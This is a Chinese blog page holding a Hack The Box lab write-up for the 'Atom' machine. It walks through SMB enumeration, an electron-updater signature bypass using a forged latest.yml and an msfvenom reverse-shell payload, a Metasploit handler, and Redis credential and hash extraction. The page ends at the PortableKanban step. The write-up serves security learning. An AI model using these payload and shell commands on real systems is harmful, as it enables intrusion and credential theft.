@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Atom - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Atom靶场信息  靶场类型  信息搜集Nmap首先使用NMAP进行端口扫描   Smb我们可以看到，这台靶场开启了80 135 443 445端口，以及有SMB服务 且SMB服务可以由guest权限登录，那咱们就先看看smb有啥吧 smbclient -L &#x2F;&#x2F;&#x2F;&#x2F;10.10.10.237&#x2F;&#x2F;&#x2F;&#x2F;  密码为空即可   看看我们可以匿名阅读的内容有哪些 smbmap -u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Atom - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Atom靶场信息  靶场类型  信息搜集Nmap首先使用NMAP进行端口扫描   Smb我们可以看到，这台靶场开启了80 135 443 445端口，以及有SMB服务 且SMB服务可以由guest权限登录，那咱们就先看看smb有啥吧 smbclient -L &#x2F;&#x2F;&#x2F;&#x2F;10.10.10.237&#x2F;&#x2F;&#x2F;&#x2F;  密码为空即可   看看我们可以匿名阅读的内容有哪些 smbmap -u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/3aeafb47-8fc4-46b4-be86-6a0a49062efd.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/b32c86c2-4bd0-4a89-9cdc-9e4174fe61f1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/dd926d4e-9a1b-4f19-adb8-f97fde301460.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/978fb275-7126-4774-bfa9-b59312805be3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/54d7c1d0-7ef0-47f4-947a-f9f34e0b64fd.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/ca92100a-9f73-469c-8b4f-66d24d1ed2ed.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/eba4868a-9dad-4612-83f0-263bb5c90f12.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/79287bd2-cac8-4f49-9338-b16c1345428d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/5e7e6b40-955a-4574-9e8a-2e8b8a062987.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/0d945013-c4bb-49a0-b793-245e9f284e9e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/614c8d33-4173-47c8-a05b-ced63892f4f8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/02f0988b-a3f0-487b-b4b5-85e6ca5ad2f5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/3e914921-9098-4971-9530-038745e49625.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/bee2234d-5d40-4422-b748-83dc6bfe7758.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/72b012ad-49ae-4978-8d51-ffbffd41ce08.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/fbc8b7f2-2ab1-4bd8-86fe-be406a76db43.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/935136a5-9fcc-4ff5-aecd-f0c5a057538d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/0b0cdabc-3dd8-4fe7-9710-c21c76ba44fe.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/ed184c95-5181-47a7-951d-b65e26dcc45b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/2a62ebef-89ac-46c2-a711-95141cc37718.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/8c6b16d3-bc66-41ea-938a-d35f473483a2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/9c8742ef-a0cb-453e-9809-185ae8092dda.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a52b4aef-6929-454c-9a29-f842ad7d9bb8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/6157165b-d499-4087-bc6f-a16bbfed85d1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/d7215416-bdc3-43b9-88f0-a3bd339e9d1c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/eef83432-f347-48b4-8634-50056cb1dbd9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/61216e59-103e-4f74-8ca4-562b5b22a224.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/15bcce74-cf7b-4fbb-9ab0-8932fa5363aa.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/4e36ec59-bb2c-4354-9cdc-c2818cf78045.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/e1caef27-db98-4aac-a3d1-9a46d2ef2a46.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/854cf26a-9bbc-4ee6-aeab-f62894aac05d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/9d859e61-0515-4fa3-8468-0b5fd3a21de6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a6ae1e69-e7cb-4cb4-b652-89de16390776.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/f0f5f382-388e-462b-a13f-82423a387176.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/de95ab75-3203-4f11-b667-153dea67ad1c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/9082084a-87a0-471a-a677-81b82f07f72c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/75ee9e81-f1cd-4218-ad6c-f21f29e4c7f8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/e924337d-64f8-496a-b583-b2c40b2b9e58.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/d1a7f259-5a46-4991-ab72-8b8fa1173dfc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a066ecf7-4788-4aba-8928-eba943d62062.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a6e357b5-a45e-4f96-954a-866299be7e5d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/34b65aae-b69a-4d26-bfc2-210a88b1e460.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/799d353d-1433-4c65-a925-613a39f269fa.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/e2e8800b-c412-498f-975e-12a7e53614a8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/49bda4c4-0f12-40b4-adc6-4e9fb4d65843.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/f8a3f043-81bf-4df9-b3f3-60994ae1d8ed.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/1c6f36a8-2ce4-4c33-8fa6-d59f7001fee6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/7035a9a4-b916-4f12-a2c5-19bdcecbfb0b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/5a78abb7-ac35-4f0b-912b-6838642dff2a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/4538043d-86b4-4f9a-9c95-2a5538bb127a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/5a78848e-2539-43eb-8160-41b16bab2a67.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/58206c5f-6b3f-4e44-a467-add1442634ff.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/6c83bbff-2a3c-4a69-8be2-4f57872ec033.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/f35152b2-72e4-4b20-88b4-fc6d5bfed0cf.png">
+<meta property="article:published_time" content="2021-06-05T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:40:03.632Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/3aeafb47-8fc4-46b4-be86-6a0a49062efd.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Atom - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Atom - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-06-05T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-06-05
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Atom"><span class="post-toc-text">Hackthebox - Atom</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Smb"><span class="post-toc-text">Smb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Gobuster"><span class="post-toc-text">Gobuster</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-Atom"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Atom - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-06-05 19:38:36" datetime="2021-06-05T11:38:36.000Z"  itemprop="datePublished">2021-06-05</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Atom"><a href="#Hackthebox-Atom" class="headerlink" title="Hackthebox - Atom"></a>Hackthebox - Atom</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a><strong>靶场信息</strong></h1><img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/3aeafb47-8fc4-46b4-be86-6a0a49062efd.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a><strong>靶场类型</strong></h1><img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/b32c86c2-4bd0-4a89-9cdc-9e4174fe61f1.png" class>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>首先使用NMAP进行端口扫描</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/dd926d4e-9a1b-4f19-adb8-f97fde301460.png" class>
+
+<h2 id="Smb"><a href="#Smb" class="headerlink" title="Smb"></a>Smb</h2><p>我们可以看到，这台靶场开启了80 135 443 445端口，以及有SMB服务</p>
+<p>且SMB服务可以由guest权限登录，那咱们就先看看smb有啥吧</p>
+<pre><code class="cpp">smbclient -L ////10.10.10.237////
+</code></pre>
+<p>密码为空即可</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/978fb275-7126-4774-bfa9-b59312805be3.png" class>
+
+<p>看看我们可以匿名阅读的内容有哪些</p>
+<pre><code class="cpp">smbmap -u &#39;anonymous&#39; -p &#39;&#39; -H 10.10.10.237
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/54d7c1d0-7ef0-47f4-947a-f9f34e0b64fd.png" class>
+
+<p>看来可以匿名读写Software_Updates目录</p>
+<pre><code class="cpp">smbclient [\\\\10.10.10.237\\Software_Updates](file:///////10.10.10.237//Software_Updates)
+</code></pre>
+<p>登录 然后使用dir查看</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/ca92100a-9f73-469c-8b4f-66d24d1ed2ed.png" class>
+
+<p>看来UAT_Testing_Procedures.pdf文档可以被下载，咱们使用get进行下载</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/eba4868a-9dad-4612-83f0-263bb5c90f12.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/79287bd2-cac8-4f49-9338-b16c1345428d.png" class>
+
+<p>我们可以看到，该文档描述了一个名为Heed的笔记应用，它是一个基于客户端的应用程序，没有与服务器交互。但是它确实通过客户端文件夹进行了更新，我们可以看到已经有三个文件夹了，分别是client1、client2、client3，所以我们接下来访问80端口</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/5e7e6b40-955a-4574-9e8a-2e8b8a062987.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/0d945013-c4bb-49a0-b793-245e9f284e9e.png" class>
+
+<p>我们往下翻滚，可以看到一个下载按钮和一个邮箱<a href="mailto:&#x4d;&#114;&#x52;&#x33;&#x62;&#x6f;&#111;&#x74;&#x40;&#97;&#x74;&#111;&#109;&#46;&#104;&#x74;&#x62;">&#x4d;&#114;&#x52;&#x33;&#x62;&#x6f;&#111;&#x74;&#x40;&#97;&#x74;&#111;&#109;&#46;&#104;&#x74;&#x62;</a></p>
+<p>既然域名都给了，那还是老规矩，添加hosts吧</p>
+<pre><code class="cpp">vim /etc/hosts
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/614c8d33-4173-47c8-a05b-ced63892f4f8.png" class>
+
+<h2 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h2><p>既然都添加了，那目录爆破和子域名爆破就不能少了，爆破吧</p>
+<p>gobuster爆破目录</p>
+<pre><code class="cpp">gobuster dir -u &quot;http://10.10.10.237/&quot; -x php,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/02f0988b-a3f0-487b-b4b5-85e6ca5ad2f5.png" class>
+
+<p>gobuster爆破DNS</p>
+<pre><code class="cpp">gobuster dns -d &#39;atom.htb&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/3e914921-9098-4971-9530-038745e49625.png" class>
+
+<p>简单爆破了一下，好像都没啥有用的东西，那咱们只能去下载了</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/bee2234d-5d40-4422-b748-83dc6bfe7758.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/72b012ad-49ae-4978-8d51-ffbffd41ce08.png" class>
+
+<p>下载下来后是一个exe程序，这就不得不切换一台windows的机器出来了</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/fbc8b7f2-2ab1-4bd8-86fe-be406a76db43.png" class>
+
+<p>安装好后是酱婶儿的</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/935136a5-9fcc-4ff5-aecd-f0c5a057538d.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/0b0cdabc-3dd8-4fe7-9710-c21c76ba44fe.png" class>
+
+<p>这告诉我们这是一个电子应用程序</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/ed184c95-5181-47a7-951d-b65e26dcc45b.png" class>
+
+<p>通过Googles搜索rce程序</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/2a62ebef-89ac-46c2-a711-95141cc37718.png" class>
+
+<blockquote>
+<p><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html" target="_blank" rel="noopener">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p>
+</blockquote>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/8c6b16d3-bc66-41ea-938a-d35f473483a2.png" class>
+
+<p>Juliano Rizzo 这里提到了是由这位大佬发现的漏洞，感谢</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/9c8742ef-a0cb-453e-9809-185ae8092dda.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a52b4aef-6929-454c-9a29-f842ad7d9bb8.png" class>
+
+<p>这里说它将从latest.yml进行更新</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p>首先我们生成带有单引号的有效负载</p>
+<pre><code class="cpp">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.184 LPORT=4444 -f exe &gt; &quot;u&#39;payload.exe&quot;
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/6157165b-d499-4087-bc6f-a16bbfed85d1.png" class>
+
+<p>现在我们需要生成一个 sha512 sum hash 并将其转换为十六进制，然后进一步转换为base64</p>
+<pre><code class="cpp">shasum -a 512 &quot;u&#39;payload.exe&quot; | cut -d &quot; &quot; -f1 | xxd -r -p | base64
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/d7215416-bdc3-43b9-88f0-a3bd339e9d1c.png" class>
+
+<pre><code class="cpp">kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg==
+</code></pre>
+<p>创建latest.yml文件</p>
+<pre><code class="cpp">version: 1.0.1
+path: http://10.10.14.184/u&#39;payload.exe
+sha512: kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg==
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/eef83432-f347-48b4-8634-50056cb1dbd9.png" class>
+
+<p>使用python3开启一个http服务器</p>
+<pre><code class="cpp">python3 -m http.server 80
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/61216e59-103e-4f74-8ca4-562b5b22a224.png" class>
+
+<p>替换掉smb共享中的yml文件</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/15bcce74-cf7b-4fbb-9ab0-8932fa5363aa.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/4e36ec59-bb2c-4354-9cdc-c2818cf78045.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/e1caef27-db98-4aac-a3d1-9a46d2ef2a46.png" class>
+
+<p>三个文件夹都要替换</p>
+<pre><code class="cpp">use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+</code></pre>
+<p>使用msfconsole开启监听</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/854cf26a-9bbc-4ee6-aeab-f62894aac05d.png" class>
+
+<p>配置好配置项后exploit执行</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/9d859e61-0515-4fa3-8468-0b5fd3a21de6.png" class>
+
+<p>我们可以看到 http服务器里已经收到了GET请求</p>
+<p>然后我们再去看看MSF</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a6ae1e69-e7cb-4cb4-b652-89de16390776.png" class>
+
+<p>已经成功getshell了</p>
+<p>如果没有弹回shell，就多尝试几次，或使用1.2.3版本号</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a><strong>权限提升</strong></h1><img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/f0f5f382-388e-462b-a13f-82423a387176.png" class>
+
+<p>为了提权，我先输入了getprivs查看当前用户的权限</p>
+<p>输入shell进入shell控制</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/de95ab75-3203-4f11-b667-153dea67ad1c.png" class>
+
+<p>首先进入Program Files目录</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/9082084a-87a0-471a-a677-81b82f07f72c.png" class>
+
+<p>然后进入Redis目录</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/75ee9e81-f1cd-4218-ad6c-f21f29e4c7f8.png" class>
+
+<p>然后我们看到redis的配置文件 redis.windows-service.conf</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/e924337d-64f8-496a-b583-b2c40b2b9e58.png" class>
+
+<p>我们可以看到，里面有redis cli的密码kidvscat_yes_kidvscat</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/d1a7f259-5a46-4991-ab72-8b8fa1173dfc.png" class>
+
+<p>然后咱们发现这台靶机的6379端口 也就是redis服务开着呢，那就直接登录吧</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a066ecf7-4788-4aba-8928-eba943d62062.png" class>
+
+<p>登录成功，并使用info进行信息查看</p>
+<p>使用keys *列出所有hash</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/a6e357b5-a45e-4f96-954a-866299be7e5d.png" class>
+
+<p>e8e29158-d70d-44b1-a1ba-4949d52790a0</p>
+<p>查看user用户的相关信息</p>
+<p>get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/34b65aae-b69a-4d26-bfc2-210a88b1e460.png" class>
+
+<p>我们得到了一个管理员的hash</p>
+<p>Odh7N3L9aVQ8&#x2F;srdZgG2hIR0SSJoJKGi</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/799d353d-1433-4c65-a925-613a39f269fa.png" class>
+
+<p>同时我们在用户jason的桌面发现了一个user.txt</p>
+<p>成功拿到user权限的flag</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/e2e8800b-c412-498f-975e-12a7e53614a8.png" class>
+
+<p>在检查其他文件的时候，找到了两个文件夹，咱们进去看看</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/49bda4c4-0f12-40b4-adc6-4e9fb4d65843.png" class>
+
+<p>这里似乎没什么有用的东西，咱们看看另一个文件夹</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/f8a3f043-81bf-4df9-b3f3-60994ae1d8ed.png" class>
+
+<p>这个程序引起了我的兴趣，然后去Google了一下</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/49409" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49409</a></p>
+</blockquote>
+<p>然后找到了一个exp</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/1c6f36a8-2ce4-4c33-8fa6-d59f7001fee6.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/7035a9a4-b916-4f12-a2c5-19bdcecbfb0b.png" class>
+
+<p>可能。。。这就是缘分吧？</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/5a78abb7-ac35-4f0b-912b-6838642dff2a.png" class>
+
+<p>咱们查看一下配置文件Portablekanban.cfg</p>
+<p>获得了portablekanban的hash值</p>
